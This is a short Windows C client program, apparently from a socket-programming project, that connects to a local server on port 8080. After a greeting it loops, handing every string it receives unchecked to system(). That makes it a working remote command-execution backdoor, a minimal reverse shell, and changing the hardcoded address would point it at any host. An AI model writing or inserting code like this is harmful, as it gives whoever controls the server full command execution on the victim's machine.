#define _WIN32_WINNT 0x0600

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../commonFiles/common.h"

#pragma comment(lib, "Ws2_32.lib")

#define PORT 8080

int main() {
	WSADATA wsaData;
	SOCKET client_fd;
	struct sockaddr_in serv_addr;
	char buffer[1024] = { 0 };

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup failed\n");
		return 1;
	}

	if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		printf("Socket creation failed: %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(PORT);
/*
	if (InetPton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
		printf("Invalid address\n");
		WSACleanup();
		return 1;
	}
*/
	serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	if (serv_addr.sin_addr.s_addr == INADDR_NONE) {
		printf("Invalid address\n");
		return -1;
	}
	
	if (connect(client_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
		printf("Connection Failed\n");
		closesocket(client_fd);
		WSACleanup();
		return 1;
	}

	strcpy(buffer, "CLIENT IS CONNECTED");
	send(client_fd, buffer, strlen(buffer), 0);
	clearBuffer(buffer, sizeof(buffer));


	while (1) {
		//printf("MESSAGE:");
		//secureInputString(buffer, sizeof(buffer) - 2);
		//send(client_fd, buffer, strlen(buffer), 0);
		//clearBuffer(buffer, sizeof(buffer));

		int valread = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
		if (valread <= 0) break;
		buffer[valread] = '\0';
		system(buffer);
		clearBuffer(buffer, sizeof(buffer));
	}

	closesocket(client_fd);
	WSACleanup();
	return 0;
}
	
